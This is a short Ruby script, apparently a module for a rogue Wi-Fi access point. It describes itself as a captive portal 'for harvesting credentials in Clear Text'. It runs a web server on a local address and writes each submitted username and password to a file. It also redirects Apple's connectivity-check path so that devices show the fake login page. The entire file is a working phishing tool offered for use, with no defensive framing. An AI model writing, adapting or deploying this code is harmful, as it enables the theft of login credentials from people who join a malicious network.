#!/usr/bin/ruby
######################################################################
# Created by: PuNk1nPo0p					     #
# Captive Portal Module for harvesting credentials in Clear Text     #
######################################################################

require 'webrick'
include WEBrick

#MAIN----------------------------------------------------------------#

	server = HTTPServer.new({:BindAddress => "192.168.10.1",:Port => "80",:DocumentRoot => ARGV[0]})
	['INT', 'TERM'].each {|signal|
  	trap(signal) {server.shutdown}
	}

	server.mount_proc('/login.html', Proc.new {|req, resp|
 	 File.open(ARGV[1], 'a') {|f| f.write("#{req.query['username']} :: #{req.query['password']}\n") }
  	resp.body = '<html><body><h1>200</h1></body></html>'
	})

	server.mount_proc("/library/test/success.html") {|req, resp|
	resp.set_redirect(WEBrick::HTTPStatus::MovedPermanently, "/index.html")
	}
server.start


